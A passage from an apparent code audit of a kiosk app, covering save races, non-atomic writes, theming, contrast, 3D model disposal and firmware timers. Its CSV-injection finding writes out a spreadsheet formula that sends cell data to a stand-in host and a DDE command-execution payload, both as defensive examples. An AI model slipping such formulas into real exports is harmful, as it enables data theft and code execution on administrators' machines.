1. The operator opens `https://localhost:5173/#/admin` → Lexicon.
2. They fix a typo mapping and click **Save**.
3. The POST takes 800 ms (n8n round-trip through the admin workflow).
4. During those 800 ms they notice another wrong canonical term and correct it.
5. The response arrives and replaces state with the pre-edit lexicon.
6. **The second correction vanishes.** No "Unsaved" badge, no error. The operator
   believes both edits were saved.

### The fix

Two changes; apply both.

**(a) Lock the form while saving.** Pass the saving state down to the row components and
disable their inputs:

```tsx
const isSaving = status.kind === "saving";
…
<TermRow
  …
  disabled={isSaving}
/>
```

In `TermRow`, add `disabled={disabled}` to every `<input>`, `<select>` and `<button>`.

**(b) Do not let a mutation clear the saving status.** Change the three mutation helpers
so they only reset a *non-saving* status:

```tsx
// Clearing an error/saved banner on edit is intentional, but a save in flight
// must stay marked as such — otherwise the Save button re-enables mid-request
// and a second overlapping save can interleave with the first.
const clearTransientStatus = useCallback(() => {
  setStatus((s) => (s.kind === "saving" ? s : { kind: "idle" }));
}, []);

const updateTerm = useCallback((i: number, patch: Partial<LexiconTerm>) => {
  setTerms((prev) => prev.map((t, idx) => (idx === i ? { ...t, ...patch } : t)));
  clearTransientStatus();
}, [clearTransientStatus]);
```

Apply the same to `removeTerm` (line 243), `addTerm` (line 248), and the other
`setStatus({ kind: "idle" })` call sites in this file.

**(c) Optional but recommended — guard against overlapping requests.** Add a request
sequence number so a stale response cannot win:

```tsx
const saveSeqRef = useRef(0);
…
async function handleSave() {
  if (localIssue || status.kind === "saving") return;
  const seq = ++saveSeqRef.current;
  …
  const result = await client.saveLexicon(passcode, payload);
  if (seq !== saveSeqRef.current) return;   // a newer save superseded this one
  …
}
```

### How to verify

Throttle the network to "Slow 3G" in DevTools, click Save, and type into a term field
while the request is pending. **Expected:** the field is disabled and the edit is
impossible. **Bug present:** the edit is accepted and then silently discarded.

---

## F-14 — Non-atomic write can truncate `branding.json` and 500 every future read

- **Severity:** MEDIUM (permanent loss of tenant branding)
- **Location:** `web/ws-server.ts:140`
- **Category:** data loss

### Current code

`web/ws-server.ts:119-147`:

```ts
async function writeBranding(req: Request): Promise<Response> {
  const denied = requireOperator(req);
  if (denied) return denied;

  const raw = await req.text();
  if (raw.length > MAX_CONFIG_BYTES) {
    return json({ error: "Config too large." }, 413);
  }

  let parsed: unknown;
  try {
    parsed = JSON.parse(raw);
  } catch {
    return json({ error: "Body is not valid JSON." }, 400);
  }
  if (typeof parsed !== "object" || parsed === null || Array.isArray(parsed)) {
    return json({ error: "Config must be a JSON object." }, 400);
  }

  try {
    await mkdir(dirname(BRANDING_FILE), { recursive: true });
    await Bun.write(BRANDING_FILE, JSON.stringify(parsed, null, 2));
  } catch (err) {
    console.error("[branding] write failed", err);
    return json({ error: "Could not persist the config to disk." }, 500);
  }
```

And the read side, `web/ws-server.ts:102-117`:

```ts
async function readBranding(): Promise<Response> {
  const file = Bun.file(BRANDING_FILE);
  if (!(await file.exists())) {
    // No config yet — the client falls back to its built-in defaults.
    return json({});
  }
  try {
    return json(await file.json());
  } catch (err) {
    console.error("[branding] stored config is not valid JSON", err);
    return json(
      { error: "Stored branding config is corrupt; serving defaults." },
      500,
    );
  }
}
```

### Why it is wrong

`Bun.write` **truncates the destination file and then writes into it**. Between the
truncate and the completion of the write, `branding.json` on disk is incomplete.

There is also no serialization: two concurrent `PUT`s both truncate and both write, and
the interleaving is undefined.

If the write is interrupted — container restart, disk full, the host being shut down — the
file is left as truncated, unparseable JSON. `readBranding` then returns HTTP 500 for
**every subsequent GET**, permanently, with no self-repair.

### Failure scenario (this is your test case)

1. Two staff members both have `#/admin` → Branding open and both press Save within the
   same second. Or one presses Save while `docker compose restart web` is running.
2. `branding.json` is left containing, say, `{ "id": "iul", "identity": { "na`.
3. Every kiosk's `loadBranding` gets a 500 and falls back to its **localStorage cache**,
   so already-running devices look fine and the problem is invisible.
4. A new tablet is brought online, or an existing one has its site data cleared. It has
   no cache, so it boots with **neutral defaults** — no logo, no brand colours, no
   tenant name.
5. The Branding tab cannot repair it, because it loads the current config first and gets
   a 500. The only fix is hand-editing the file on the host.

### The fix

Write to a temporary file and rename. `rename` within the same filesystem is atomic on
both Linux and Windows — a reader sees either the entire old file or the entire new one,
never a partial write. Add a simple in-process mutex so concurrent PUTs queue.

```ts
import { rename, mkdir } from "node:fs/promises";

// Serialises concurrent PUTs. Two operators pressing Save at the same moment
// would otherwise both truncate the file and interleave their writes.
let brandingWriteChain: Promise<unknown> = Promise.resolve();

async function persistBranding(parsed: unknown): Promise<void> {
  const tmp = `${BRANDING_FILE}.tmp-${process.pid}-${Date.now()}`;
  await mkdir(dirname(BRANDING_FILE), { recursive: true });
  // Write to a sibling temp file, then rename. Bun.write truncates in place,
  // so an interrupted direct write leaves unparseable JSON that makes every
  // future GET return 500 with no path back short of editing the file by hand.
  await Bun.write(tmp, JSON.stringify(parsed, null, 2));
  await rename(tmp, BRANDING_FILE);
}
```

and in `writeBranding`, replace the `try` block with:

```ts
  try {
    const job = brandingWriteChain.then(() => persistBranding(parsed));
    // Keep the chain alive even if this write fails, so one failure does not
    // wedge every later save.
    brandingWriteChain = job.catch(() => undefined);
    await job;
  } catch (err) {
    console.error("[branding] write failed", err);
    return json({ error: "Could not persist the config to disk." }, 500);
  }
```

**Important:** the temp file must be in the **same directory** as the target, so the
rename stays within one filesystem. `/app/branding` is a bind mount, so a temp file in
`/tmp` would make `rename` fail with `EXDEV`.

**Also consider** making `readBranding` self-heal: if the file is corrupt but a
`branding.json.bak` exists, serve that instead of 500ing. Write the `.bak` from
`persistBranding` before the rename. Put that in a separate commit.

### How to verify

```bash
# Corrupt the file the way an interrupted write would
docker compose exec web sh -c 'printf "{\"id\":\"iul\",\"ident" > /app/branding/branding.json'
curl -k https://localhost:5173/api/branding      # observe the 500
```

Then restore a good config through the admin UI and confirm that a `PUT` followed by an
immediate `docker compose restart web` never leaves the file unparseable.

---

## F-15 — Global transition freeze is orphaned if `paintTheme` throws

- **Severity:** MEDIUM
- **Location:** `web/src/lib/branding/theme.ts:51-63`
- **Category:** error handling
- **Related:** R-01 explains why this matters more than it looks.

### Current code

`web/src/lib/branding/theme.ts:51-66`:

```ts
function withoutTransitions(mutate: () => void) {
  const freeze = document.createElement("style");
  freeze.textContent =
    "*,*::before,*::after{transition:none !important;animation-duration:0s !important}";
  document.head.appendChild(freeze);

  mutate();

  // Force a synchronous style flush so the new values are committed while
  // transitions are still disabled, then restore them on the next frame.
  void document.body?.offsetHeight;
  requestAnimationFrame(() => freeze.remove());
}

export function applyTheme(config: TenantConfig) {
  withoutTransitions(() => paintTheme(config));
}
```

### Why it is wrong

Two independent problems:

1. **No `try/finally`.** If `mutate()` — i.e. `paintTheme(config)` — throws, execution
   leaves the function immediately. `requestAnimationFrame(() => freeze.remove())` is
   never scheduled. The `<style>` element stays in `<head>` for the lifetime of the
   document, with `transition:none !important` and `animation-duration:0s !important`
   applied to **every element on the page**.
2. **`requestAnimationFrame` does not fire in a backgrounded tab.** Even on the success
   path, if the operator saves branding and immediately switches to another tab, the
   frame callback is deferred until the tab is refocused, and transitions stay frozen
   for that whole period.

The throw in case 1 is not hypothetical — it is exactly what F-07 produces
(`paintTheme` reading `theme.brand` off a string).

### Failure scenario (this is your test case)

1. An operator is in `#/admin` → Branding, using the live preview.
2. `BrandingProvider.update()` fires on each keystroke with a partially-typed draft
   config, e.g. `brand: "#f5"` mid-typing.
3. `hexToRgb("#f5")` produces `NaN` components, or a related read throws.
4. `paintTheme` throws after the freeze `<style>` was appended.
5. **Every CSS transition and animation in the app is now permanently disabled** — the
   `pulse-soft` and `breathe` keyframes on the avatar, every button hover, every input
   focus ring. Only a full page reload restores them.
6. On the kiosk, the mascot's idle breathing animation stops, which reads as the kiosk
   having frozen.

### The fix

```ts
function withoutTransitions(mutate: () => void) {
  const freeze = document.createElement("style");
  freeze.textContent =
    "*,*::before,*::after{transition:none !important;animation-duration:0s !important}";
  document.head.appendChild(freeze);

  // The freeze MUST be lifted on every exit path. Leaving it behind disables
  // every transition and animation in the app for the lifetime of the
  // document, and only a reload clears it.
  try {
    mutate();
  } finally {
    // Force a synchronous style flush so the new values are committed while
    // transitions are still disabled, then restore them on the next frame.
    void document.body?.offsetHeight;
    // rAF does not fire in a backgrounded tab, so a timer backstops it: an
    // operator who saves and immediately switches tabs would otherwise hold
    // the freeze until they came back.
    let lifted = false;
    const lift = () => {
      if (lifted) return;
      lifted = true;
      freeze.remove();
    };
    requestAnimationFrame(lift);
    setTimeout(lift, 250);
  }
}
```

`freeze.remove()` is safe to call on an element already removed from the DOM, but the
`lifted` flag makes the intent explicit and avoids a redundant DOM operation.

### How to verify

In the browser console on `https://localhost:5173/`:

```js
// Confirm no orphaned freeze style is present
[...document.head.querySelectorAll("style")].filter(s => s.textContent.includes("transition:none")).length
// should be 0 at rest
```

Then trigger a theme apply with a deliberately broken config and re-run the check — it
should still be 0.

---

# 4. Secondary findings

These are real but lower-impact. Fix them after the primary list.

---

## S-01 — CSV formula injection from visitor-typed question text

- **Severity:** MEDIUM (security)
- **Location:** `web/src/lib/adminFormat.ts:85-88`

### Current code

```ts
/** Minimal CSV cell escaping — wraps in quotes when the value contains a
 *  comma, quote, or newline, doubling any embedded quotes. */
function csvCell(value: unknown): string {
  const s = value === null || value === undefined ? "" : String(value);
  if (/[",\n]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}
```

### Why it is wrong

The function correctly handles CSV *quoting*, but does nothing about **formula
injection**. Excel and LibreOffice treat a cell beginning with `=`, `+`, `-`, `@`, tab,
or carriage return as a formula to evaluate — and `downloadCsv` deliberately prepends a
UTF-8 BOM specifically so Excel opens the file.

The `question` and `answer` columns exported by `QuestionLog` and `UnknownQuestions`
contain **text typed by anonymous kiosk visitors**.

### Failure scenario

1. A visitor types at the kiosk: `=HYPERLINK("http://evil.example/?d="&A1,"Click for info")`
2. The string contains no comma, quote or newline, so `csvCell` returns it bare.
3. An administrator opens `#/admin` → Question Log → "Export page CSV".
4. Excel opens the BOM'd file and evaluates the cell as a live formula. `@SUM`,
   `=cmd|' /C calc'!A0` (the classic DDE payload) and data-exfiltrating `HYPERLINK`
   formulas all become live in the administrator's spreadsheet.

### The fix

```ts
/** Minimal CSV cell escaping. Quotes when the value contains a comma, quote or
 *  newline, doubling any embedded quotes — and prefixes a single quote to any
 *  value that a spreadsheet would treat as a formula. The question and answer
 *  columns carry text typed by anonymous kiosk visitors, and downloadCsv adds a
 *  BOM specifically so Excel opens the file, so an unescaped leading `=` is a
 *  live formula in the administrator's spreadsheet. */
function csvCell(value: unknown): string {
  let s = value === null || value === undefined ? "" : String(value);
  // Excel/Sheets/LibreOffice treat these leading characters as formula starts.
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  if (/[",\n]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}
```

Note the leading-quote prefix must be applied **before** the quoting step, so it ends up
inside the quoted cell.

### How to verify

Submit a question starting with `=` at the kiosk, then export the Question Log CSV and
open it in a text editor. The cell should read `'=…`, not `=…`.

---

## S-02 — `readableOn` threshold gives ~2:1 contrast on mid-light brands

- **Severity:** MEDIUM (accessibility)
- **Location:** `web/src/lib/branding/color.ts:152-155`

### Current code

```ts
/** Text colour that stays legible on top of `hex`. */
export function readableOn(hex: string): Triplet {
  return luminance(hex) > 0.45 ? "15 23 42" : "255 255 255";
}
```

### Why it is wrong

The white/black crossover point for WCAG contrast is at a relative luminance of
approximately **0.179**, not 0.45. (It is the L that solves
`(1.05)/(L+0.05) = (L+0.05)/0.05`.) Every brand colour whose luminance falls in the
0.179–0.45 band gets **white** text when it should get dark text.

### Failure scenario

A tenant sets `theme.brand` to `#f59e0b` (amber), relative luminance ≈ 0.439.

- `readableOn` returns `"255 255 255"` (white).
- Contrast of white on that amber: `1.05 / (0.439 + 0.05) ≈ 2.15:1`.
- WCAG AA for normal text requires **4.5:1**.
- The dark option `15 23 42` would have given ≈ 9.5:1.

`text-on-brand` is used on the kiosk's primary call-to-action button, so this is the most
prominent text on the screen. The same applies to `#22c55e`, `#eab308`, `#a3e635` and
any other mid-light brand.

### The fix

```ts
/** Text colour that stays legible on top of `hex`.
 *
 *  0.179 is the WCAG crossover: the relative luminance at which white and black
 *  give equal contrast. Above it, dark text wins; below it, white does. A
 *  higher threshold puts white text on mid-light brands (amber, lime, mid
 *  green) at roughly 2:1, well under AA's 4.5:1. */
export function readableOn(hex: string): Triplet {
  return luminance(hex) > 0.179 ? "15 23 42" : "255 255 255";
}
```

### Related, same file, line 123

`buildRamp` computes the dark half as `base.l - d * (base.l - DARK_EXTREME)` with no
guard for `base.l < DARK_EXTREME`. A very dark anchor (e.g. `#0b1020`, lightness ≈ 0.086,
below `DARK_EXTREME` = 0.1) makes stops 700–950 come out **lighter** than 600, so the
ramp is non-monotonic and `bg-brand-800` renders paler than `bg-brand-600`. The same
inversion is reached whenever `hexToRgb` falls back to `[0,0,0]` on an unparseable hex.
Clamp the anchor before fanning out:

```ts
const raw = rgbToHsl(...hexToRgb(hex));
// Keep the anchor inside the ramp's own extremes, otherwise the "darker" half
// computes lighter values than the anchor and the ramp inverts.
const base = { ...raw, l: Math.min(Math.max(raw.l, DARK_EXTREME), LIGHT_EXTREME) };
```

---

## S-03 / S-04 — GLB models stack on swap, and a load failure gives a blank canvas

- **Severity:** MEDIUM
- **Location:** `web/src/components/Avatar3D.tsx:160` (S-03) and `:164` (S-04)

### Current code

```tsx
        const holder = new THREE.Group();
        holder.add(root);
        holder.scale.setScalar(scale);
        // Shift slightly up so face is centered in viewport
        holder.position.set(0, 0.05, 0);
        groupRef.current?.add(holder);
        setReady(true);
      },
      undefined,
      (err) => console.error("[Avatar3D] load failed", err),
    );
    return () => { alive = false; };
    // Re-loads when the tenant swaps their avatar model.
  }, [gl, modelUrl]);
```

### Why S-03 is wrong

The effect's own comment promises it re-loads on a `modelUrl` change, and `modelUrl` is
in the dependency array — but the cleanup only sets `alive = false`. It never removes the
previously added `holder` from `groupRef.current`, and nothing ever calls `.dispose()` on
the discarded model's geometries, materials or textures.

**Failure scenario:** a tenant uploads a new avatar model through the Branding tab.
`BrandingProvider.update()` re-renders the tree in place, so `<Avatar3D>` stays mounted
and the effect re-runs. `groupRef.current.add(holder)` adds a *second* model to the same
group. Both heads render superimposed. `morphMapRef.current` is overwritten, so the first
model freezes at whatever morph influences it last had. The discarded model's GPU buffers
stay resident for the life of the WebGL context.

**Fix:** track the holder in a ref and tear it down in the cleanup.

```tsx
const holderRef = useRef<THREE.Group | null>(null);

// … inside the load callback, before adding:
if (holderRef.current) {
  groupRef.current?.remove(holderRef.current);
  disposeObject(holderRef.current);
}
holderRef.current = holder;
groupRef.current?.add(holder);

// … in the cleanup:
return () => {
  alive = false;
  if (holderRef.current) {
    groupRef.current?.remove(holderRef.current);
    disposeObject(holderRef.current);
    holderRef.current = null;
  }
  morphMapRef.current = {};
  setReady(false);
};
```

with a helper:

```tsx
/** Three.js does not free GPU memory on garbage collection — geometries,
 *  materials and textures each hold a buffer that must be released explicitly. */
function disposeObject(obj: THREE.Object3D) {
  obj.traverse((child) => {
    const mesh = child as THREE.Mesh;
    if (mesh.geometry) mesh.geometry.dispose();
    const mat = mesh.material;
    if (Array.isArray(mat)) mat.forEach(disposeMaterial);
    else if (mat) disposeMaterial(mat as THREE.Material);
  });
}

function disposeMaterial(mat: THREE.Material) {
  for (const value of Object.values(mat)) {
    if (value && typeof value === "object" && "isTexture" in value) {
      (value as THREE.Texture).dispose();
    }
  }
  mat.dispose();
}
```

### Why S-04 is wrong

The loader's error callback only logs. `setReady(true)` is never called, so
`<group visible={ready}>` stays invisible forever.

**Failure scenario:** a tenant sets `avatar.kind: "glb"` with a `glbUrl` that 404s (a
typo, or an asset upload that did not land). The user sees an empty transparent panel
several hundred pixels tall, forever. No error boundary trips, the `HealthBanner` does not
cover this case, and there is no degrade to `image` / `mascot` / `none`.

**Fix:** surface the failure and let the caller fall back.

```tsx
      undefined,
      (err) => {
        console.error("[Avatar3D] load failed", err);
        // A failed load must be visible to the caller, otherwise the tenant
        // gets a blank panel with no indication anything is wrong and no way
        // to fall back to another renderer.
        if (alive) setLoadError(err instanceof Error ? err : new Error(String(err)));
      },
```

Add `const [loadError, setLoadError] = useState<Error | null>(null);`, expose it through
the component's props contract (an `onLoadError` callback is cleanest), and have the
avatar-selection site in `App.tsx` fall back to the `mascot` or `none` renderer when it
fires.

### Also in this file — S-04b, framerate-dependent morph smoothing

`Avatar3D.tsx:187-192`:

```tsx
const set = (key: string, v: number, lerp = 0.35) => {
  const entries = map[key];
  if (!entries) return;
  for (const { mesh, index } of entries) {
    const infl = mesh.morphTargetInfluences!;
    infl[index] += (v - infl[index]) * lerp;
  }
};
```

`dt` is computed and clamped at line 172 and used correctly by the blink phase machine,
but `set` uses a **constant** per-frame lerp factor. On a 120 Hz tablet every expression
converges roughly twice as fast as on a 60 Hz display; in a throttled tab at 30 fps they
crawl — while the blink keeps identical timing in all three cases, making the mismatch
visible. Make it framerate-independent:

```tsx
// Exponential smoothing normalised to a 60fps baseline, so expressions
// converge at the same wall-clock rate on a 120Hz tablet and a throttled tab.
// The blink phase machine already uses dt; without this the two drift apart.
const set = (key: string, v: number, lerp = 0.35) => {
  const entries = map[key];
  if (!entries) return;
  const k = 1 - Math.pow(1 - lerp, dt * 60);
  for (const { mesh, index } of entries) {
    const infl = mesh.morphTargetInfluences!;
    infl[index] += (v - infl[index]) * k;
  }
};
```

---

## S-05 — Haar cascade loaded from a hardcoded absolute Windows path

- **Severity:** MEDIUM (the script cannot run anywhere but one developer's machine)
- **Location:** `face_detect.py:87-89`

### Current code

```python
    # Load OpenCV's built-in face detector
    face_cascade = cv2.CascadeClassifier(
    r'C:\Users\USER\Desktop\haici-agent\haarcascade_frontalface_default.xml'
)
```

### Why it is wrong

The cascade file **is** committed at the repository root, but it is referenced by an
absolute path pinned to one machine. Worse, `cv2.CascadeClassifier` **fails silently**
when the file is missing: it returns an empty classifier rather than raising.

### Failure scenario

1. The repository is cloned to any other path, or run on the Linux kiosk host.
2. `CascadeClassifier` returns an empty object. No exception.
3. `[camera] Camera opened (index 0)` prints, so it looks like it is working.
4. The first `detectMultiScale` call at line 106 throws:
   `cv2.error: (-215:Assertion failed) !empty() in function 'detectMultiScale'`
   and the process dies with a message that does not name the real problem.

### The fix

```python
import os

# The cascade ships with OpenCV, so prefer that copy; fall back to the one
# committed next to this script. An absolute path pinned to one machine makes
# the script unrunnable anywhere else, and CascadeClassifier fails SILENTLY on
# a missing file — the error only surfaces later, inside detectMultiScale.
CASCADE_CANDIDATES = [
    os.path.join(cv2.data.haarcascades, "haarcascade_frontalface_default.xml"),
    os.path.join(os.path.dirname(os.path.abspath(__file__)),
                 "haarcascade_frontalface_default.xml"),
]

cascade_path = next((p for p in CASCADE_CANDIDATES if os.path.exists(p)), None)
if cascade_path is None:
    sys.exit(f"[face] No Haar cascade found. Looked in: {CASCADE_CANDIDATES}")

face_cascade = cv2.CascadeClassifier(cascade_path)
if face_cascade.empty():
    sys.exit(f"[face] Cascade at {cascade_path} failed to load.")
print(f"[face] Using cascade: {cascade_path}")
```

The explicit `.empty()` check is the important part — it converts a silent failure into a
clear message at startup.

### How to verify

`python face_detect.py` from a different working directory. It must either run or print a
clear message naming the paths it searched.

---

## S-06 — Presence detection suppressed for the first 3 minutes after every boot

- **Severity:** MEDIUM
- **Location:** `Hardware/src/main.cpp:397` and `:409`

### Current code

```cpp
// ── Ultrasonic presence detection ─────────────────────────────────────────────
static unsigned long lastUltrasonicMs = 0;
static unsigned long lastPresenceMs   = 0;
static bool          wasPresent       = false;

static void checkPresence() {
  if (millis() - lastUltrasonicMs < ULTRASONIC_POLL_MS) return;
  lastUltrasonicMs = millis();

  uint16_t dist  = readDistanceCm();
  bool     present = (dist < cfg.presenceCm);

  if (present) {
    if (!wasPresent) {
      unsigned long idleMs = millis() - lastPresenceMs;
      if (idleMs >= cfg.idleTimeoutMs) {
        Serial.printf("[ULTRA] Person detected after %.1f min idle -> presence_detected\n",
                      idleMs / 60000.0f);
        wsSendRaw("{\"type\":\"presence_detected\"}");
      }
      wasPresent = true;
    }
    lastPresenceMs = millis();
```

### Why it is wrong

`lastPresenceMs` is initialised to `0`, and `millis()` **also starts at 0** on boot. So
immediately after a reset, `idleMs = millis() - 0 = millis()` — a small number. The
`idleMs >= cfg.idleTimeoutMs` guard therefore fails for the entire first
`idleTimeoutMs` of uptime.

### Failure scenario

1. The kiosk is power-cycled. WiFi and the WebSocket come up at roughly t = 8 s.
2. A visitor walks into range at t = 45 s.
3. `idleMs = 45000`, which is less than `cfg.idleTimeoutMs` (default 3 minutes =
   180000), so the branch is skipped. `wasPresent` is set to `true`, so no later frame
   re-triggers it either.
4. **The kiosk silently ignores everyone for the first three minutes after every
   reboot.**

`face_detect.py` avoids this only by accident: its `time.time() - 0` is an epoch-sized
number, which is always greater than any timeout.

### The fix

Sentinel the "never seen anyone" state explicitly:

```cpp
static unsigned long lastUltrasonicMs = 0;
// millis() also starts at 0, so a 0 sentinel would read as "someone was here at
// boot" and suppress every detection for the first idleTimeoutMs of uptime.
// A dedicated flag distinguishes "nobody has ever been seen" from "nobody has
// been seen for a while".
static bool          seenAnyoneYet    = false;
static unsigned long lastPresenceMs   = 0;
static bool          wasPresent       = false;
```

and in the branch:

```cpp
  if (present) {
    if (!wasPresent) {
      unsigned long idleMs = millis() - lastPresenceMs;
      if (!seenAnyoneYet || idleMs >= cfg.idleTimeoutMs) {
        Serial.printf("[ULTRA] Person detected after %.1f min idle -> presence_detected\n",
                      seenAnyoneYet ? idleMs / 60000.0f : 0.0f);
        wsSendRaw("{\"type\":\"presence_detected\"}");
      }
      wasPresent = true;
    }
    seenAnyoneYet  = true;
    lastPresenceMs = millis();
```

### Note on a related issue in the same file

`runConnectivityCheck()` (around line 661) performs **blocking** `HTTPClient` requests from
inside `loop()`, despite a comment claiming it does not block the WebSocket. On a
captive-portal network the worst case is roughly 28 seconds — 4 s connect + 4 s read for
the first probe, 5 s + 5 s for the portal auto-accept GET and POST, then another probe —
with no `ws.loop()` call and no `handleButtons()` in that window. Every button press is
lost and the WebSocket ping/pong times out and drops. Because `wsPending` is cleared on
each WiFi loss, a flapping access point re-runs the whole check on every reconnect. Fixing
this properly means restructuring the check as a non-blocking state machine — track it as
separate work rather than folding it into this fix.

---

## S-07 — `aliasDrafts` keyed by index writes an alias onto the wrong term

- **Severity:** LOW (but it corrupts the live typo lexicon)
- **Location:** `web/src/components/admin/LexiconEditor.tsx:156`, `:244`, `:439`, `:443`

### Current code

```tsx
const [aliasDrafts, setAliasDrafts] = useState<Record<number, string>>({});
…
const removeTerm = useCallback((i: number) => {
  setTerms((prev) => prev.filter((_, idx) => idx !== i));
  setStatus({ kind: "idle" });
}, []);
…
    aliasDraft={aliasDrafts[i] ?? ""}
    …
    onAddAlias={() => addAlias(i, aliasDrafts[i] ?? "")}
```

### Why it is wrong

`aliasDrafts` is a `Record<number, string>` keyed by the term's **array index**.
`removeTerm` filters the array, shifting every subsequent term's index down by one — but
`aliasDrafts` is left untouched, so its keys now point at different terms.

The rows are also rendered with `key={i}` (line 434), so React reuses the same DOM nodes
across the shift, keeping focus and any uncommitted input text on the shifted row.

### Failure scenario

1. The terms list is `[IUL, Beirut, Tripoli]`.
2. The operator types `beiruut` into Beirut's alias box (`aliasDrafts[1]`) and
   `tripolee` into Tripoli's (`aliasDrafts[2]`), pressing Enter on neither.
3. They delete term #0 (IUL).
4. `terms` becomes `[Beirut, Tripoli]`. `aliasDrafts` is unchanged.
5. Tripoli is now at index 1, so line 439 hands it `aliasDrafts[1]` = `"beiruut"`.
6. Clicking that row's `+` calls `addAlias(1, "beiruut")` and attaches **Beirut's**
   mis-hearing to **Tripoli** — a wrong-row write into the live typo-correction lexicon
   used by every future question.

### The fix

Key the drafts by something stable. The term's `canonical` value is the natural
identifier:

```tsx
// Keyed by canonical rather than by array index: removeTerm splices the array,
// which shifts every later index down one and would hand a pending draft to a
// different term than the one it was typed into.
const [aliasDrafts, setAliasDrafts] = useState<Record<string, string>>({});
```

Update the three usage sites to `aliasDrafts[term.canonical]`, and change the list's
`key={i}` to `key={term.canonical || \`__new_${i}\`}` (a newly-added term has an empty
canonical until the operator types one, so it still needs an index-based fallback).

If `canonical` can be duplicated or edited freely mid-session, generate a stable client-side
id when a term is created instead, and key on that. Check `validateLocal` to see whether
duplicate canonicals are already rejected before choosing.

---

# 5. Systemic rule violations

These are not bugs today, but they violate the documented rules in §0.2 and will produce
bugs the moment a tenant changes their theme.

---

## R-01 — `transition-all` on `.btn`, `.btn-icon` and `.input`

- **Location:** `web/src/index.css:143`, `:157`, `:161`
- **Rule broken:** §0.2 rule 5

```css
  .btn {
    @apply inline-flex items-center justify-center gap-2 rounded-2xl px-4 py-2 font-medium tracking-wide transition-all duration-200 ease-out
      focus:outline-none focus:ring-2 focus:ring-brand-400/40 disabled:opacity-50 disabled:cursor-not-allowed;
  }
  …
  .btn-icon {
    @apply … hover:bg-neutral-100 transition-all;
  }
  …
  .input {
    @apply … focus:ring-2 focus:ring-brand-300/20 transition-all;
  }
```

`CLAUDE.md` states this explicitly, and `web/src/components/Mascot2D.tsx:363` documents
the same hazard in a code comment. Chrome will not re-resolve a transitioning property
when the custom property behind it changes, so a button that was mid-transition during a
tenant swap keeps rendering the **previous tenant's colour** indefinitely.

This is currently masked only by the `withoutTransitions` freeze in
`web/src/lib/branding/theme.ts` — which is exactly the mechanism F-15 shows can be
skipped or orphaned. Fix F-15 first, then remove the reliance:

```css
  .btn {
    @apply inline-flex items-center justify-center gap-2 rounded-2xl px-4 py-2 font-medium tracking-wide
      transition-[background-color,border-color,color,box-shadow,opacity] duration-200 ease-out
      focus:outline-none focus:ring-2 focus:ring-brand-400/40 disabled:opacity-50 disabled:cursor-not-allowed;
  }
```

Do the same for `.btn-icon` and `.input`. Enumerate only the properties each rule
actually animates. Note `.chip` (line 165) already uses the bare `transition` utility,
which is Tailwind's enumerated shorthand — that one is fine.

**Before committing, grep the whole tree for others:**

```bash
grep -rn "transition-all\|transition: all" web/src/ web/*.js web/*.ts
```

---

## R-02 — `UsageHeatmap` hardcodes teal and slate, ignoring the tenant theme

- **Location:** `web/src/components/admin/UsageHeatmap.tsx:14`, `:18`
- **Rule broken:** §0.2 rule 4

```tsx
function intensity(count: number, max: number): string {
  if (count === 0) return "rgba(148, 163, 184, 0.08)";
  const t = max > 0 ? count / max : 0;
  // Interpolate from a pale to a deep teal.
  const alpha = 0.15 + t * 0.75;
  return `rgba(15, 118, 110, ${alpha.toFixed(2)})`;
}
```

`rgb(15, 118, 110)` is IUL's teal and `rgb(148, 163, 184)` is Tailwind's `slate-400`,
both written as literals. Every other admin panel retargets correctly — `Breakdowns`
uses `bg-teal-500/80`, and the Recharts panels read `chartColors()` — so this is the one
component in the dashboard that stays teal when a tenant's brand is purple.

This is plain HTML/CSS rather than an SVG attribute, so the Recharts exemption does not
apply: the CSS custom properties resolve here.

### The fix

The theme system already writes `--brand-600` and `--neutral-400` as space-separated RGB
triplets specifically so they can be used inside `rgb()` with an alpha:

```tsx
function intensity(count: number, max: number): string {
  // The theme writes its ramps as space-separated RGB triplets precisely so
  // they can carry a runtime alpha. Hardcoding the teal here would leave this
  // one panel on IUL's brand for every other tenant.
  if (count === 0) return "rgb(var(--neutral-400) / 0.08)";
  const t = max > 0 ? count / max : 0;
  const alpha = 0.15 + t * 0.75;
  return `rgb(var(--brand-600) / ${alpha.toFixed(2)})`;
}
```

Confirm the exact custom-property names emitted by `emitRamp` in
`web/src/lib/branding/theme.ts` before using them — read the function rather than
trusting the names above.

### How to verify

Change `theme.brand` in `#/admin` → Branding to a clearly different hue (e.g. `#7c3aed`)
and confirm the Usage Heatmap changes colour along with every other panel.

---

# 6. Suggested working order

Fix in this sequence. The grouping keeps related changes in one mental context and puts
the highest-risk items first.

### Batch 1 — Data leaking between visitors (do this first)
- **F-01** greeting name leak
- **F-04** language fence (check the live workflow first — §0.3)

Both are cache-correctness issues in the same workflow. Do them together, re-export once,
and run `python tools/visitor-privacy-test/cache_key_audit.py` and
`tools/visitor-privacy-test/leak_suite.py` afterwards.

### Batch 2 — Answers being lost
- **F-02** fan-in empty answer
- **F-03** TTS failure discards the answer

Same workflow, same class of problem. Re-export with the batch-1 changes if you have not
already.

### Batch 3 — The kiosk failing to work at all
- **F-07** defaults merge (do this before F-06 — it is the trigger)
- **F-06** bootstrap catch
- **F-05** stale session on wake
- **F-12** localStorage guard

These four are what make the difference between "the kiosk has a bug" and "the kiosk is a
blank screen".

### Batch 4 — Security and durability of the sidecar
- **F-08** WebSocket authentication
- **F-14** atomic branding write

### Batch 5 — Hardware and sensor paths
- **F-09** presence cooldown
- **F-11** camera gesture re-arm
- **F-10** microphone teardown
- **S-06** ESP32 boot presence timer

### Batch 6 — Admin dashboard and theming
- **F-13** lexicon save race
- **F-15** transition freeze
- **R-01** `transition-all` removal (after F-15)
- **R-02** heatmap colours
- **S-01** CSV injection
- **S-02** contrast threshold and ramp clamp
- **S-07** alias drafts keying

### Batch 7 — Avatar and tooling
- **S-03** / **S-04** GLB disposal and load failure
- **S-05** cascade path

---

# 7. Things that were checked and found NOT to be bugs

Recorded so nobody re-investigates them.

- **`Mascot2D.tsx`** — the `requestAnimationFrame` loop *is* properly cancelled on
  unmount, the props ref *is* written in the render body (so it never goes stale),
  amplitude *is* clamped at both ends, and the `VISEME_BANDS.find(...)!` non-null
  assertion is safe because of the `Infinity` sentinel band. The face-overlay percentage
  maths is correct because the stage box is a uniformly scaled master canvas.
- **Aspect-ratio contract** — both callers honour it. `LandingPage.tsx:56` uses `h-full`
